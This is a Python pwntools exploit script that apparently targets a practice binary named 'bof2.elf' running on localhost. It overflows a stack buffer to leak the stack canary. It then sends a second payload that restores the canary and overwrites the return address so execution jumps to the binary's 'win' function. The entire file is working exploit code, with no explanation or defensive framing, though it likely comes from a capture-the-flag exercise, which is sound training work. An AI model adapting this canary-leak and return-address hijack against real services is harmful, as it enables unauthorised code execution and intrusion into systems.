import pwn

HOST = 'localhost'
PORT = 4002

pwn.context.arch = 'x86-64'
addr = {}

elf = pwn.ELF('./bof2.elf')

addr['win'] = elf.symbols['win']

def exploit():
    io = pwn.remote(port=PORT,host=HOST)

    recv = io.recv(1024)

    print(f"recv = {recv}")

    payload = pwn.flat(
        b'A' * 0x29
    )

    io.send(payload)
    print(f'payload = {payload}')

    recv = io.recvrepeat(1)
    print(f"recv = {recv}")

    canary = recv[48:55]
    print(f"_canary = {canary}")

    payload = pwn.flat(
        b'A' * 0x28,
        b'\x00',
        canary,

        pwn.pack(0),
        pwn.pack(addr['win'])
    )

    io.send(payload)
    print(f'payload = {payload}')

    recv = io.recvrepeat(1)
    print(f"recv = {recv}")

    io.close()

    print(f"win addr = {hex(addr['win'])}")

if(__name__=='__main__'):
    exploit()